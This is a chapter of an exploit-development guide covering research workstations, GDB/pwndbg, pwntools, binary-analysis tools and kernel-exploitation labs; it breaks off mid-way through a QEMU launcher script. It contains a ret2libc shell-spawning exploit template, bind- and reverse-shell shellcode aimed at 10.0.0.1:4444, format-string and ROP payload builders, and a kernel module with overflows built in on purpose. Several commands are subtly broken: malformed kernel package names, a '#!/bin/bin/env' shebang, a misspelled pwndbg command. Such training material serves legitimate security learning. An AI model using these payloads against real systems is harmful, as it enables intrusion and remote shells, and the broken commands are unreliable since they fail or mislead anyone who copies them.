# 07 — Zero-Day Research Tooling, Infrastructure & Debug Environments

> Your exploit is only as good as your environment. This chapter builds the complete workstation, toolchain, and automation layer that professional vulnerability researchers and exploit developers rely on daily.

---

## 1. The Ultimate Exploit Development Workstation

### 1.1 OS Setup — Ubuntu Base with Multi-Kernel Support

Run a recent Ubuntu LTS as the host. Install build-essentials, cross-compilers, and QEMU first:

```bash
#!/usr/bin/env bash
# setup_workstation.sh — full exploit-dev workstation bootstrap
set -euo pipefail

sudo apt update && sudo apt upgrade -y

# Core build toolchain
sudo apt install -y \
  build-essential gcc gcc-multilib g++-multilib \
  libc6-dbg libc6-dev-i386 linux-headers-$(uname -r) \
  git tmux curl wget python3 python3-pip python3-venv \
  libssl-dev libffi-dev zlib1g-dev

# Kernel build dependencies
sudo apt install -y \
  libncurses5-dev bison flex libelf-dev \
  bc dwarves openssl debhelper \
  kernel-package ccache

# QEMU and virtualisation
sudo apt install -y \
  qemu-system-x86 qemu-system-arm qemu-user \
  qemu-utils libvirt-daemon-system virt-manager \
  docker.io containerd

# Binary analysis and debugging
sudo apt install -y \
  gdb gdb-multiarch radare2 binutils \
  binwalk nasm yasm nasm-macros

# Add user to groups
sudo usermod -aG docker,virt,kvm $USER

# Python exploit-dev environment
python3 -m venv ~/exploit-venv
source ~/exploit-venv/bin/activate
pip install --upgrade pip
pip install pwntools ropper keystone-engine capstone \
  angr ipython unicorn lark pyelftools

echo "Workstation setup complete. Reboot for group changes."
```

**Multiple kernel versions** — keep several kernel packages installed simultaneously for testing across versions:

```bash
# Install specific kernel versions for testing
sudo apt install -y \
  linux-image-5.4.0--generic linux-headers-5.4.0-generic \
  linux-image-5.15.0-generic linux-headers-5.15.0-generic \
  linux-image-6.2.0--generic  linux-headers-6.2.0-.generic

# At boot, select kernel version from GRUB. Persist default:
sudo sed -i 's/GRUB_DEFAULT=.*/GRUB_DEFAULT="Advanced options for Ubuntu>Ubuntu, with Linux 5.4.0-generic"/' \
  /etc/default/grub && sudo update-grub
```

### 1.2 Docker-Based Challenge Environments

Create reproducible, disposable challenge environments:

```dockerfile
# Dockerfile.pwn — general-purpose CTF pwn challenge container
FROM ubuntu:22.04

RUN apt-get update && apt-get install -y \
    gcc-multilib libc6-dbg libc6-dev-i386 \
    gdb python3 python3-pip socat && \
    rm -rf /var/lib/apt/lists/*

RUN pip3 install pwntools

# Create unprivileged user
RUN useradd -m -s /bin/bash ctf
USER ctf
WORKDIR /home/ctf

# Expose challenge port
EXPOSE 9999
```

```bash
#!/usr/bin/env bash
# launch_challenge.sh — build and run a challenge container
CHAL_DIR="${1:?Usage: $0 <challenge_directory>}"
CHAL_NAME="$(basename "$CHAL_DIR")"

docker build -t "pwn-${CHAL_NAME}" - < Dockerfile.pwn

docker run -d --name "${CHAL_NAME}" \
  --security-opt seccomp=unconfined \
  --security-opt apparmor=unconfined \
  -p 9999:9999 \
  -v "$(pwd)/${CHAL_DIR}:/home/ctf" \
  "pwn-${CHAL_NAME}" \
  socat TCP-LISTEN:9999,reuseaddr,fork EXEC:/home/ctf/chal

echo "Challenge running on localhost:9999"
echo "Attach shell:  docker exec -it ${CHAL_NAME} bash"
echo "Stop:          docker stop ${CHAL_NAME}"
```

### 1.3 SSH Automation for Remote Targets

```bash
# ~/.ssh/config — exploit lab hosts
Host pwn-target-1
    HostName 192.168.56.101
    User root
    IdentityFile ~/.ssh/pwn_lab_key
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null

Host pwn-target-2
    HostName 192.168.56.102
    User root
    IdentityFile ~/.ssh/pwn_lab_key
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
```

```python
# ssh_remote.py — pwntools SSH tube example
from pwn import *

shell = ssh(host='192.168.56.101', user='root', keyfile='~/.ssh/pwn_lab_key')
shell.set_working_directory('/tmp')

# Upload and execute
shell.upload('./exploit')
shell.run('chmod +x exploit')
io = shell.run('./exploit')
io.interactive()
```

---

## 2. GDB Mastery — Beyond Basic Debugging

### 2.1 pwndbg Setup

```bash
#!/usr/bin/env bash
# install_pwndbg.sh
cd ~
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
```

### 2.2 Must-Have .gdbinit

```gdb
# ~/.gdbinit — complete exploit development GDB configuration

# ---- pwndbg / GEF auto-load ----
# pwndbg installs its own init; if using GEF instead:
# source ~/gef/gef.py

# ---- General settings ----
set disassembly-flavor intel
set disassemble-on-line on
set pagination off
set confirm off
set print asm-demangle on
set logging file gdb_log.txt
set logging on

# ---- History ----
set history save on
set history size 10000
set history filename ~/.gdb_history

# ---- Pretty-printing ----
set print object on
set print pretty on
set print array on
set print array-indexes on

# ---- Architecture ----
set architecture i386:x86-64

# ---- Custom commands ----
define hexdump
  x/256xb $arg0
end
document hexdump
  Dump 256 bytes in hex at given address.
  Usage: hexdump <address>
end

define context-flexible
  context
  regs
end

define got
  set $n = $arg0
  set $idx = 0
  while $idx < $n
    printf "%3d: %p -> %p\n", $idx, *((void**)($gef_config.got_address) + $idx), *(void**)(*((void**)($gef_config.got_address) + $idx))
    set $idx = $idx + 1
  end
end

define find_rw_pages
  info proc mappings
end

define set_breakpoint_at_all_calls
  # Break on every 'call' instruction in current function
  x/200i $pc
end

# ---- Breakpoint aliases ----
define bp
  break $arg0
end

define bpc
  break $arg0
  continue
end

define bpe
  break *$arg0
end

# ---- Shellcode helpers ----
define dump_shellcode
  printf "Shellcode (%d bytes):\n", $arg1
  x/$arg1xb $arg0
  printf "\n"
end

# ---- Kernel-specific ----
define kmsg
  # Read kernel log buffer (requires lx-scripts)
  lx-dmesg
end

define kps
  lx-ps
end

# ---- Auto-load scripts for specific binaries ----
# set directories /path/to/custom/gdb/scripts

# ---- Skip boring frames in backtrace ----
frame-filter global priority 100

# ---- Keep pwndbg happy ----
set unwindonsignal on
```

### 2.3 pwndbg Command Cheat Sheet

| Command | Purpose |
|---------|---------|
| `context` | Show registers, stack, disassembly, code at pc |
| `vmmap` | Virtual memory map (like `/proc/pid/maps`) |
| `checksec` | Binary security mitigations |
| `got` / `gotplt` | Display GOT entries |
| `plt` | Display PLT entries |
| `telelescope <addr> [n]` | Dereference chain starting at addr |
| `dereference <addr>` | Single dereference |
| `stack [n]` | Show n stack qwords |
| `leakfind <start> <end> <offset> <n>` | Search for pointer chains |
| ` rop --distinct` | Find all ROP gadgets (requires ropper/ROPgadget) |
| `nearpc [n]` | Disassemble n instructions around pc |
| `nextcall` | Step until next call instruction |
| `nextjmp` | Step until next jump instruction |
| `stepuntil <insn>` | Step until specific instruction type |
| `search <pattern>` | Search memory for pattern |
| `pdb <addr>` | Load Python pdb at address |
| `varinfo <symbol>` | Show variable type and location |
| `probe <addr>` | Check page permissions at addr |

### 2.4 Kernel Debugging with GDB + QEMU

Launch QEMU with debug stub:

```bash
#!/usr/bin/env bash
# qemu_kernel_debug.sh — launch kernel in QEMU with GDB stub
KERNEL="${1:-./bzImage}"
INITRD="${2:-./rootfs.cpio.gz}"

qemu-system-x86_64 \
  -m 256M \
  -kernel "$KERNEL" \
  -initrd "$INITRD" \
  -nographic \
  -append "console=ttyS0 nokaslr root=/dev/ram0 rw oops=panic panic=1 quiet" \
  -s \
  -S \
  -cpu qemu64,+smep,+smap \
  -netdev user,id=net0,hostfwd=tcp::2222-:22 \
  -device e1000,netdev=net0 \
  -gdb tcp::1234
```

Connect from another terminal:

```bash
gdb ./vmlinux \
  -ex "target remote :1234" \
  -ex "continue"
```

For **KGDB** over serial, append `kgdboc=ttyS0,115200 kgdbwait` to the kernel command line, then:

```gdb
# In GDB
target remote /dev/ttyS0
# or for QEMU serial:
target remote localhost:1234
```

### 2.5 Hardware Watchpoints and Catching Corruption

```gdb
# Watch a variable for writes (hardware watchpoint)
watch global_ptr
# Watch for reads AND writes
awatch important_buffer[0]

# Conditional breakpoint — only fire when return value is 0xdeadbeef
break *0x0804856a
condition 1 $eax == 0xdeadbeef

# Catch specific malloc/free patterns
break malloc
condition 2 *((int*)$rdi) == 0x41414141

# Catch heap corruption: break on free with specific chunk
break free
condition 3 (int)$rdi > 0x600000 && (int)$rdi < 0x610000

# Catch signal handlers
catch signal SIGALRM

# Catch execve calls
catch syscall execve
```

### 2.6 rr — Record and Replay

```bash
# Install rr
sudo apt install rr

# Record execution
rr record ./vulnerable_binary

# Replay (deterministic!)
rr replay

# Inside rr replay, use reverse execution:
# reverse-continue   — run backward until a breakpoint
# reverse-step       — step backward one source line
# reverse-next       — next backward one source line
# reverse-finish     — run backward to caller
# when               — show current event number
# goto <event>       — jump to specific event
```

Typical workflow for finding when memory gets corrupted:

```gdb
# Set watchpoint on target address
watch *(int*)0x7fffffffde10
# Run forward; it fires at the corruption point
# Use 'when' to note the event number
# Reverse-continue to go back to the write that caused it
reverse-continue
```

---

## 3. pwntools — The Exploit Developer's Swiss Army Knife

### 3.1 Complete Exploit Template

```python
#!/usr/bin/env python3
# exploit_template.py — production-quality pwntools exploit template
from pwn import *
import sys

# ---- Context Configuration ----
context.arch = 'amd64'           # 'i386', 'arm', 'aarch64', 'mips'
context.os = 'linux'
context.log_level = 'INFO'       # DEBUG for full I/O, INFO for normal
context.terminal = ['tmux', 'splitw', '-h']  # for gdb.attach()

# ---- Binary & Libc Paths ----
BINARY = './vuln'
LIBC = './libc.so.6'

elf = ELF(BINARY, checksec=True)
libc = ELF(LIBC) if os.path.exists(LIBC) else None

# ---- Helper Functions ----
def conn(mode='local', host='127.0.0.1', port=9999):
    """Connect to target — local, remote, or SSH."""
    if mode == 'local':
        return process(BINARY)
    elif mode == 'remote':
        return remote(host, port)
    elif mode == 'ssh':
        s = ssh(host=host, user='user', port=22)
        return s.process(BINARY)
    else:
        log.error(f"Unknown mode: {mode}")

def debug(io, breaks=None, script=''):
    """Attach GDB to a local process with breakpoints."""
    if args.GDB:
        gdb_script = ''
        if breaks:
            for b in breaks:
                gdb_script += f'b *{b}\n'
        gdb_script += script
        gdb.attach(io, gdb_script)

def sla(io, delim, data):
    """Send data after receiving delim."""
    io.sendlineafter(delim, data)

def offset(pattern_len, overflow_after=0):
    """Calculate offset via cyclic pattern."""
    return cyclic(pattern_len, n=context.bytes).find(cyclic_fit(overflow_after))

LOG = lambda s: log.info(s)

# ---- Main Exploit ----
def exploit(io):
    # Calculate offsets
    padding = b'A' * elf.symbols.get('buf', 0) if 'buf' in elf.symbols else b'A' * 64

    # Example: ret2libc
    if libc:
        puts_got = elf.got['puts']
        puts_plt = elf.plt['puts']
        main_addr = elf.symbols['main']
        pop_rdi = next(elf.search(asm('pop rdi; ret')))

        # Stage 1: leak libc address
        payload = flat(
            b'A' * 64,          # buffer overflow padding
            pop_rdi,            # pop rdi; ret gadget
            puts_got,           # argument: GOT entry for puts
            puts_plt,           # return to puts@plt
            main_addr           # return to main for second stage
        )
        io.sendlineafter(b':', payload)
        io.recvline()
        leaked = u64(io.recv(6).ljust(8, b'\x00'))
        libc_base = leaked - libc.symbols['puts']
        LOG(f"Libc base: {hex(libc_base)}")

        # Stage 2: system("/bin/sh")
        libc.address = libc_base
        system_addr = libc.symbols['system']
        binsh_addr = next(libc.search(b'/bin/sh\x00'))
        payload2 = flat(
            b'A' * 64,
            pop_rdi,
            binsh_addr,
            system_addr
        )
        io.sendlineafter(b':', payload2)
    else:
        log.error("No libc provided")

    io.interactive()

# ---- Entry Point ----
if __name__ == '__main__':
    mode = sys.argv[1] if len(sys.argv) > 1 else 'local'
    host = sys.argv[2] if len(sys.argv) > 2 else '127.0.0.1'
    port = int(sys.argv[3]) if len(sys.argv) > 3 else 9999

    io = conn(mode, host, port)
    debug(io, breaks=[0x400623])  # set breakpoints if --GDB flag used
    exploit(io)
```

### 3.2 Pattern Creation and Finding

```python
from pwn import *

# Create cyclic pattern
pattern = cyclic(200)         # 200-byte pattern (4-byte sub-pattern alignment)
print(pattern.hex())

# Find offset — when crash occurs at a known value:
crash_val = 0x61616168       # example EIP value from crash
off = cyclic_find(crash_val)
log.info(f"Offset to EIP: {off}")

# For architectures with different alignment:
context.arch = 'amd64'
pattern64 = cyclic(200, n=8)  # 8-byte alignment for 64-bit
crash_val64 = 0x6161616861616167
off64 = cyclic_find(crash_val64, n=8)
```

### 3.3 Shellcraft — Shellcode Generation

```python
from pwn import *

# x86 execve("/bin/sh")
sc_x86 = shellcraft.i386.linux.sh()
print(asm(sc_x86))

# x64 execve("/bin/sh")
sc_x64 = shellcraft.amd64.linux.sh()
print(asm(sc_x64))

# Bind shell on port 4444
sc_bind = shellcraft.i386.linux.bindsh(4444)
print(asm(sc_bind, arch='i386'))

# Reverse shell to 10.0.0.1:4444
sc_rev = shellcraft.i386.linux.connect('10.0.0.1', 4444) + \
         shellcraft.i386.linux.dupsh()  # dup2 stdin/stdout/stderr
print(asm(sc_rev, arch='i386'))

# Make shellcode null-free
sc_clean = shellcraft.i386.linux.sh()
sc_asm = asm(sc_clean)
# Verify no null bytes:
assert b'\x00' not in sc_asm, "Shellcode contains null bytes!"

# Custom: read into buffer then jump
sc_custom = shellcraft.amd64.linux.read(0, 'rsp', 0x200) + \
            shellcraft.amd64.linux.syscall('sys_mprotect', 'rsp', 0x2000, 7) + \
            'jmp rsp'
print(asm(sc_custom, arch='amd64').hex())

# Cat flag
sc_cat_flag = shellcraft.amd64.linux.cat('/flag')
print(asm(sc_cat_flag, arch='amd64'))
```

### 3.4 ELF Parsing and Gadget Finding

```python
from pwn import *

elf = ELF('./vulnerable')

# Symbols
print(hex(elf.symbols['main']))
print(hex(elf.got['printf']))       # GOT entry
print(hex(elf.plt['printf']))      # PLT stub

# Search for strings
for addr in elf.search(b'/bin/sh\x00'):
    print(f"/bin/sh at {hex(addr)}")

# Search for gadgets (inline, without external tools)
pop_rdi = next(elf.search(asm('pop rdi; ret', arch='amd64')))
pop_rsi_rdi = next(elf.search(asm('pop rsi; pop rdi; ret', arch='amd64')))

# Sections
for section in elf.sections:
    print(f"{section.name}: {hex(section.header.sh_addr)} size={section.header.sh_size}")

# Check relocations
for rel in elf.relocs:
    print(f"{hex(rel['r_offset'])}: type={rel['r_info_type']}")

# Disassemble at address
print(elf.disasm(elf.entry, 64))
```

### 3.5 ROP Chain Building

```python
from pwn import *

elf = ELF('./vulnerable')
libc = ELF('./libc.so.6')
rop = ROP(elf)

# Automatic gadget finding
print(rop.dump())        # Show all found gadgets
print(rop.ret)           # ret gadget (for alignment)
print(rop.call)          # call gadget

# Build a ROP chain to call write(1, got_printf, 8)
rop.write(1, elf.got['printf'], 8)
rop.call('main')
chain = rop.chain()
print(chain.hex())

# Using ROP with libc (set libc base first)
libc.address = 0x7f0000000000  # after leaking
rop_libc = ROP(libc)
rop_libc.system(next(libc.search(b'/bin/sh\x00')))
print(rop_libc.chain().hex())

# SROP (Sigreturn-Oriented Programming)
frame = SigreturnFrame()
frame.rax = 15          # sys_sigreturn
frame.rdi = next(libc.search(b'/bin/sh\x00'))
frame.rsi = 0
frame.rdx = 0
frame.rip = libc.symbols['syscall']
frame.rsp = 0x6969690000
chain = flat(rop.rax(15), rop.syscall, frame)
```

### 3.6 Format String Payload Generation

```python
from pwn import *

# Write 0xdeadbeef to 0x0804a024 with format string
payload = fmtstr_payload(6, {0x0804a024: 0xdeadbeef})
# Offset 6 = position of our buffer on stack

# Short write (2-byte writes) — fewer bytes, more reliable
payload_short = fmtstr_payload(6, {0x0804a024: 0xdeadbeef}, write_size='short')

# Byte write (1-byte writes) — most reliable for large targets
payload_byte = fmtstr_payload(10, {0x0804a024: 0xdeadbeef}, write_size='byte')

# Write to multiple addresses
payload_multi = fmtstr_payload(6, {
    0x0804a024: 0xdeadbeef,
    0x0804a028: 0xcafebabe,
})

# Manual format string technique
def fmt_leak(offset, read_addr, size=4):
    """Generate format string to leak memory at read_addr."""
    payload = f'%{offset}$s'.encode()
    payload = payload.ljust(size, b'\x00')
    payload += p64(read_addr)
    return payload

def fmt_write_byte(offset, target_addr, value):
    """Single-byte format string write."""
    pad_len = (8 - (len(f'%{offset}$hhn') % 8)) % 8
    payload = f'%{value}c%{offset}$hhn'.encode()
    payload += b'\x00' * pad_len
    payload += p64(target_addr)
    return payload
```

### 3.7 Tube Abstractions

```python
from pwn import *

# ---- Local Process ----
io = process('./vulnerable')
io.sendline(b'hello')
io.recvuntil(b':')
data = io.recvline()
io.interactive()

# ---- Remote ----
io = remote('challenge.ctf.com', 1337)
io.sendline(b'hello')

# ---- SSH ----
s = ssh(host='192.168.1.100', user='root', password='password')
io = s.process('./vulnerable')

# ---- Sophisticated I/O Patterns ----
# Recv until regex match
io.recvregex(b'Address: (0x[0-9a-f]+)')
io.recv(timeout=2)               # recv whatever is available

# Send after specific prompt
io.sendlineafter(b'Name: ', b'Alice')
io.sendafter(b'Continue? ', b'y')

# Recv exact number of bytes
io.recvn(8)

# Recv until newline(s), stripping them
io.recvline()

# Recv all data until EOF
io.recvall()

# Clean receive buffer
io.clean(timeout=0.5)

# Close cleanly
io.close()
```

### 3.8 Custom Logging and Debugging

```python
from pwn import *

# Custom log levels
log.info(f"Buffer at {hex(elf.symbols['buf'])}")
log.warn("ASLR is enabled!")
log.error("Exploit failed!")     # exits with error

# Success with colored output
log.success("Got shell!")

# Hexdump output
log.info(hexdump(b'\x90' * 16 + b'\x48\x31\xc0'))

# Debug mode — set context.log_level = 'DEBUG' to see all I/O
context.log_level = 'DEBUG'

# Progressive report — track exploit progress
with log.progress('Leaking libc...') as p:
    io.sendline(payload)
    data = io.recvuntil(b'\n')
    p.status(f'Received {len(data)} bytes')
    leak = u64(data.ljust(8, b'\x00'))
    p.success(f'Leaked libc address: {hex(leak)}')

# Custom context for per-target settings
with context.local(log_level='ERROR', arch='i386'):
    sc = shellcraft.i386.linux.sh()
    # Only affects this block
```

### 3.9 Libc Database Integration

```python
from pwn import *

# ---- Using libc-database (offline) ----
import subprocess

def identify_libc(leak_offsets):
    """Identify libc version from leaked function offsets.
    leak_offsets: dict like {'puts': 0x7f440, 'printf': 0xe6c90}
    """
    # Clone libc-database if not present
    db_path = os.path.expanduser('~/libc-database')
    if not os.path.exists(db_path):
        os.system('cd ~ && git clone https://github.com/niklasb/libc-database')

    # Build query string
    query_parts = []
    for func, offset in leak_offsets.items():
        query_parts.append(f'{func}={hex(offset & 0xfff)}')
    query = '&'.join(query_parts)

    # Query the database
    result = subprocess.run(
        [f'{db_path}/find', query],
        capture_output=True, text=True
    )
    return result.stdout

# ---- Simple offset calculation ----
def calc_libc_base(leaked_addr, symbol, libc_elf):
    """Calculate libc base from a leaked symbol address."""
    return leaked_addr - libc_elf.symbols[symbol]

# Example usage:
# leaked_puts = 0x7f1234567890
# libc_base = calc_libc_base(leaked_puts, 'puts', libc)
# libc.address = libc_base  # set base for pwntools relative resolution
```

---

## 4. Binary Analysis Tools

### 4.1 checksec — Security Mitigation Detection

```bash
# Standalone checksec
checksec --file=./vulnerable

# Within pwntools
python3 -c "from pwn import *; ELF('./vulnerable').checksec()"
```

Enhanced custom checksec:

```bash
#!/usr/bin/env bash
# checksec_enhanced.sh — detailed binary security analysis
BINARY="${1:?Usage: $0 <binary>}"

echo "=== Security Mitigations ==="
checksec --file="$BINARY" --output=csv | tr ',' '\n'

echo ""
echo "=== Binary Details ==="
file "$BINARY"
readelf -h "$BINARY" | grep -E "Entry|Class|Type"

echo ""
echo "=== Dynamic Symbols ==="
readelf --dyn-syms "$BINARY" | head -30

echo ""
echo "=== RELRO Details ==="
readelf -d "$BINARY" | grep -i relro
readelf -S "$BINARY" | grep -i got

echo ""
echo "=== Stack Canary Status ==="
readelf --dyn-syms "$BINARY" | grep -i stack
readelf -s "$BINARY" | grep -i "__stack_chk"

echo ""
echo "=== PIE Details ==="
readelf -h "$BINARY" | grep "Entry point"
readelf -l "$BINARY" | grep LOAD

echo ""
echo "=== Seccomp (if embedded) ==="
seccomp-tools dump "$BINARY" 2>/dev/null || echo "No seccomp filter or seccomp-tools not installed"
```

### 4.2 readelf / objdump Quick Reference

```bash
# ---- readelf one-liners ----

# All sections
readelf -S ./vuln

# All symbols
readelf -s ./vuln | less

# GOT and PLT entries
readelf -r ./vuln             # relocations (includes GOT)
objdump -d -j .plt ./vuln     # PLT disassembly
objdump -d -j .got ./vuln     # GOT section

# Program headers (LOAD segments)
readelf -l ./vuln

# Dynamic section
readelf -d ./vuln

# ---- objdump one-liners ----

# Full disassembly with source interleaved
objdump -d -M intel ./vuln | less

# Disassemble specific function
objdump -d -M intel --start-address=0x400500 --stop-address=0x400600 ./vuln

# All call targets
objdump -d ./vuln | grep 'call' | sort | uniq -c | sort -rn | head -20

# Find specific instructions
objdump -d ./vuln | grep -E 'xor\s+(eax|edx|rdi),\s*(eax|edx|rdi)'   # zeroing idiom
```

### 4.3 ROPgadget / ropper for Gadget Finding

```bash
# ROPgadget — comprehensive gadget search
ROPgadget --binary ./vuln                        # all gadgets
ROPgadget --binary ./vuln --only "pop|ret"       # only pop+ret
ROPgadget --binary ./vuln --only "pop|ret" | grep "rdi"   # pop rdi; ret
ROPgadget --binary ./vuln --string "/bin/sh"    # find string
ROPgadget --binary ./vuln --ropchain             # auto-build ROP chain

# ropper — alternative with regex
ropper --file ./vuln                              # all gadgets
ropper --file ./vuln --search "pop rdi"          # specific gadget
ropper --file ./vuln --search "mov [r?x]"        # regex search
ropper --file ./vuln --chain "execve cmd=/bin/sh" # auto chain

# In pwntools
from pwn import *
rop = ROP(ELF('./vuln'))
print(rop.find_gadget(['pop rdi', 'ret']))   # find specific gadget
print(rop.find_gadget(['leave', 'ret']))
print(rop.ret)                                 # simple ret gadget
```

### 4.4 one_gadget — Libc One-Gadgets

```bash
# Find execve(one-gadget) constraints in libc
one_gadget ./libc.so.6

# With specific libc version
one_gadget ./libc-2.31.so

# Output example:
# 0xe6c7e execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL
#
# 0xe6c81 execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL
#   [rsp+0x60] == NULL

# Build one-gadget chain in pwntools:
from pwn import *
libc = ELF('./libc.so.6')
libc.address = 0x7f0000000000   # set base

# If you know the offset from one_gadget:
one_gadget_addr = libc.address + 0xe6c7e
payload = flat(b'A' * 72, one_gadget_addr)
```

### 4.5 seccomp-tools — Sandbox Analysis

```bash
# Dump seccomp-bpf filter from running binary
seccomp-tools dump ./vuln

# Trace which syscalls are allowed/denied
seccomp-tools dump ./vuln 2>&1 | grep -E 'ALLOW|KILL|ERR'

# Common CTF patterns:
# - open + read + write (ORW challenges)
# - No execve (shellcode must read+write flag)
# - Write-only (exfiltration challenges)

# Example: if only open/read/write allowed
# Shellcode must: open("/flag") -> read(fd, buf, len) -> write(1, buf, len)
```

### 4.6 patchelf — Library Swapping

```bash
# Change the interpreter (loader) to use a specific libc
patchelf --set-interpreter ./ld-2.31.so ./vuln

# Replace the rpath to load libc from current directory
patchelf --set-rpath . ./vuln

# Verify
patchelf --print-interpreter ./vuln
patchelf --print-rpath ./vuln
ldd ./vuln    # should now show local libc

# Remove RPATH entirely
patchelf --remove-rpath ./vuln

# Force specific SONAME
patchelf --replace-needed libc.so.6 ./libc-2.31.so ./vuln
```

---

## 5. Kernel Exploitation Tooling

### 5.1 Building and Debugging Custom Kernels

```bash
#!/bin/bin/env bash
# build_kernel.sh — download, configure, and build a kernel for exploitation
KERNEL_VERSION="${1:-5.4}"
JOBS=$(nproc)

# Download kernel
cd ~
wget "https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-${KERNEL_VERSION}.tar.xz"
tar xf "linux-${KERNEL_VERSION}.tar.xz"
cd "linux-${KERNEL_VERSION}"

# Minimal config for QEMU exploitation
make defconfig

# Enable/disable options for exploitation practice
cat >> .config << 'EOF'
CONFIG_DEBUG_INFO=y
CONFIG_GDB_SCRIPTS=y
CONFIG_CONFIGFS_FS=y
CONFIG_SECURITYFS=y
CONFIG_MAGIC_SYSRQ=y
CONFIG_PRINTK=y
CONFIG_KALLSYMS=y
CONFIG_KALLSYMS_ALL=y
CONFIG_BUG_ON_DATA_CORRUPTION=y
CONFIG_DEBUG_LIST=y
CONFIG_DEBUG_SG=y
CONFIG_SLUB_DEBUG=y
CONFIG_HARDENED_USERCOPY=y
CONFIG_RANDOMIZE_MEMORY=y
CONFIG_RANDOMIZE_BASE=y
# Disable some mitigations for practice
# CONFIG_STACKPROTECTOR is not set
# CONFIG_STACKPROTECTOR_STRONG is not set
EOF

make olddefconfig
make -j${JOBS}

# Copy for QEMU use
cp arch/x86/boot/bzImage ~/kernel_lab/bzImage-5.4
cp vmlinux ~/kernel_lab/vmlinux-5.4

echo "Kernel built. bzImage: ~/kernel_lab/bzImage-5.4"
echo "Symbols:   ~/kernel_lab/vmlinux-5.4"
```

### 5.2 Creating initramfs with busybox

```bash
#!/usr/bin/env bash
# create_initramfs.sh — build minimal root filesystem for kernel exploitation
set -e

ROOTFS="$(pwd)/rootfs"
BUSYBOX="$(pwd)/busybox"

rm -rf "$ROOTFS"
mkdir -p "$ROOTFS"/{bin,sbin,etc,proc,sys,dev,tmp,root,lib,lib64,home/ctf}

# Build or download busybox
if [ ! -f "$BUSYBOX/busybox" ]; then
    git clone https://git.busybox.net/busybox "$BUSYBOX"
    cd "$BUSYBOX"
    make defconfig
    # Static build
    sed -i 's/# CONFIG_STATIC is not set/CONFIG_STATIC=y/' .config
    make -j$(nproc)
    make install
fi
cp "$BUSYBOX/busybox" "$ROOTFS/bin/"

# Create symlinks for busybox applets
cd "$ROOTFS/bin"
for applet in $(./busybox --list); do
    ln -sf busybox "$applet" 2>/dev/null || true
done

# Init script
cat > "$ROOTFS/init" << 'INITEOF'
#!/bin/sh
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs none /dev
mount -t debugfs none /sys/kernel/debug

# Enable core dumps for exploitation
ulimit -c unlimited
echo 1 > /proc/sys/kernel/core_uses_pid
echo '/tmp/core.%e.%p' > /proc/sys/kernel/core_pattern

# Network (basic)
ifconfig lo 127.0.0.1
ifconfig eth0 10.0.2.15 netmask 255.255.255.0
route add default gw 10.0.2.2

# Make / writable
mount -o remount,rw /

echo "=== Kernel Exploitation Lab ==="
echo "Kernel: $(uname -r)"
echo "Arch:    $(uname -m)"
cat /proc/version
echo "================================"

# Drop to shell (as root for exploitation practice)
exec /bin/sh
INITEOF
chmod +x "$ROOTFS/init"

# Add /etc/passwd (root, no password)
cat > "$ROOTFS/etc/passwd" << 'EOF'
root:x:0:0:root:/root:/bin/sh
ctf:x:1000:1000:ctf:/home/ctf:/bin/sh
EOF
cat > "$ROOTFS/etc/group" << 'EOF'
root:x:0:
ctf:x:1000:
EOF

# Create initramfs
cd "$ROOTFS"
find . | cpio -o -H newc 2>/dev/null | gzip > ../rootfs.cpio.gz

echo "Initramfs created: $(pwd)/../rootfs.cpio.gz"
echo "Size: $(du -sh ../rootfs.cpio.gz | cut -f1)"
```

### 5.3 Kernel Module Development for Practice

```makefile
# Makefile — for building vulnerable kernel modules
obj-m += vuln_module.o

KDIR ?= /lib/modules/$(shell uname -r)/build

all:
	make -C $(KDIR) M=$(PWD) modules

clean:
	make -C $(KDIR) M=$(PWD) clean

install:
	sudo insmod vuln_module.ko

uninstall:
	sudo rmmod vuln_module
```

```c
/* vuln_module.c — practice kernel module with intentional vulnerabilities */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>

#define PROC_NAME "vuln"

static ssize_t vuln_read(struct file *file, char __user *buf,
                          size_t count, loff_t *ppos)
{
    char *kbuf = kmalloc(256, GFP_KERNEL);
    if (!kbuf)
        return -ENOMEM;

    /* Stack buffer overflow: no bounds checking */
    char stack_buf[64];
    memset(stack_buf, 0, sizeof(stack_buf));

    /* Intentional: copy more than buffer size */
    if (count > 256)
        count = 256;
    if (copy_from_user(stack_buf, buf, count)) {
        kfree(kbuf);
        return -EFAULT;
    }

    kfree(kbuf);
    return count;
}

static ssize_t vuln_write(struct file *file, const char __user *buf,
                           size_t count, loff_t *ppos)
{
    /* Intentional: heap overflow */
    char *heap_buf = kmalloc(64, GFP_KERNEL);
    if (!heap_buf)
        return -ENOMEM;

    /* No bounds check — can write past allocation */
    if (copy_from_user(heap_buf, buf, count)) {
        kfree(heap_buf);
        return -EFAULT;
    }

    kfree(heap_buf);
    return count;
}

static const struct proc_ops vuln_ops = {
    .proc_read  = vuln_read,
    .proc_write = vuln_write,
};

static int __init vuln_init(void)
{
    proc_create(PROC_NAME, 0666, NULL, &vuln_ops);
    pr_info("vuln_module: /proc/%s created\n", PROC_NAME);
    return 0;
}

static void __exit vuln_exit(void)
{
    remove_proc_entry(PROC_NAME, NULL);
    pr_info("vuln_module: removed\n");
}

module_init(vuln_init);
module_exit(vuln_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Vulnerable kernel module for exploitation practice");
```

### 5.4 QEMU Launch Scripts for Kernel CTFs

```bash
#!/usr/bin/env bash
# run_kernel.sh — versatile kernel CTF environment launcher
set -e

KERNEL="${KERNEL:-./bzImage}"
INITRD="${INITRD:-./rootfs.cpio.gz}"
MEMORY="${MEMORY:-256M}"
SMP="${SMP:-1}"
KASLR="${KASLR:-off}"
SMEP="${SMEP:-on}"
SMAP="${SMAP:-on}"
GDB="${GDB:-0}"
PORT="${PORT:-1234}"
SSH_PORT="${SSH_PORT:-2222}"

EXTRA_ARGS=""

# Security mitigations
if [ "$SMEP" = "on" ]; then
    EXTRA_ARGS="$EXTRA_ARGS +smep"
else
    EXTRA_ARGS="$EXTRA_ARGS nosmep"
fi

if [ "$SMAP" = "on" ]; then
    EXTRA_ARGS="$EXTRA_ARGS +smap"
else
    EXTRA_ARGS="$EXTRA_ARGS nosmap"
fi

# KASLR
